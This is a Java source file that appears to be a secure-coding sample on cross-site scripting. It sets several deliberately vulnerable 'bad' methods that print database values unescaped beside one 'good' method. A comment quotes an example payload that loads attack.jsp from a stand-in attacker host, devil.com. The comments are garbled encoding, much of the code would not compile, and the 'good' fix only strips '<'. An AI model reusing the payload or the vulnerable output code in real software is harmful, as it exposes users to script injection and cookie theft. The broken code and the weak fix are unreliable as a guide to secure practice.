public class CS
{

/* 
�Ʒ� Java�ڵ尡 JSP �ڵ��� �Ϻ��� ��� �ܺ� �Է°� data ������ �ƹ��� ���͸����� ȭ�鿡 �״�� ��µ˴ϴ�.
���� �����ڰ� �ش� �Է°��� <script>url = "http://devil.com/attack.jsp;</script> �� ���� ��ũ��Ʈ �ڵ带 �ִ´ٸ� attack.jsp �ڵ尡 ����ǰ� �Ǿ�, ��Ű���� ���� ����� �� �ֽ��ϴ�.
*/
public void bad1(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;

  		conn = IO.getDBConnection();
  		statement = conn.prepareStatement("select name from users where id=0");
  		rs = statement.executeQuery(); 
  		data = rs.getString(1); 
  	

  	if (data != null)
  	{
		// ���Ⱦ��� : �ܺ� �Է°��� ���͸����� ȭ�鿡 ���
    		response.getWriter().println("<br>bad(): data = " + data);
  	}
}

public void bad1_1(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;

  		conn = IO.getDBConnection();
  		statement = conn.prepareStatement("select name from users where id=0");
  		rs = statement.executeQuery(); 
  		data = rs.getString(1); 
  		
  	PrintWriter writer = response.getWriter();

  	if (data != null)
  	{
		// ���Ⱦ��� : �ܺ� �Է°��� ���͸����� ȭ�鿡 ���
    		//response.getWriter().println("<br>bad(): data = " + data);
    		writer.println("<br>bad() : data = " + data);
  	}
}

public void bad1_2(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;

  		conn = IO.getDBConnection();
  		statement = conn.prepareStatement("select name from users where id=0");
  		rs = statement.executeQuery(); 
  		data = rs.getString(1); 
  		Byte[] dataArray = data.getByte();
  		
  	ServletOutputStream out = response.getOutputStream();

  	if (data != null)
  	{
		// ���Ⱦ��� : �ܺ� �Է°��� ���͸����� ȭ�鿡 ���
    		//response.getWriter().println("<br>bad(): data = " + data);
    		out.write("<br>bad(): data = " + dataArray);
  	}
}

public void bad1_3(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;

  		conn = IO.getDBConnection();
  		statement = conn.prepareStatement("select name from users where id=0");
  		rs = statement.executeQuery(); 
  		data = rs.getString(1); 
  		Byte[] dataArray = data.getByte();
  		
  	ServletOutputStream out = response.getOutputStream();

  	if (data != null)
  	{
		// ���Ⱦ��� : �ܺ� �Է°��� ���͸����� ȭ�鿡 ���
    		//response.getWriter().println("<br>bad(): data = " + data);
    		response.getOutputStream().write("<br>bad(): data = " + data);
  	}
}

public void bad2(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;
	System.in.read(data);

  	if (data != null)
  	{
		// ���Ⱦ��� : �ܺ� �Է°��� ���͸����� ȭ�鿡 ���
    		response.getWriter().println("<br>bad(): data = " + data);
  	}
}

public void bad3(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;
  	try {
    		conn = IO.getDBConnection();
    		statement = conn.prepareStatement("select name from users where id=0");
  	}

  	if (data != null)
  	{
		// ���Ⱦ��� : �ܺ� �Է°��� ���͸����� ȭ�鿡 ���
    		response.getWriter().println("<br>bad(): data = " + (statement.executeQuery()).getString());
  	}
}

/*
�ܺ� �Է°��� �ݵ�� ���͸� ó���Ͽ� ����մϴ�.
*/
public void good(HttpServletRequest request, HttpServletResponse response) throws Throwable
{
  	String data;

  	Connection conn = null;
  	PreparedStatement statement = null;
  	ResultSet rs = null;
  	try {
    		conn = IO.getDBConnection();
    		statement = conn.prepareStatement("select name from users where id=0");
    		rs = statement.executeQuery();
    		data = rs.getString(1); 
  	}

  	if (data != null)
  	{
		// ���� : �ܺ� �Է°��� Ư�����ڸ� ���͸�
    		response.getWriter().println("<br>bad(): data = " + data.replaceAll("<", ""));
  	}
}

}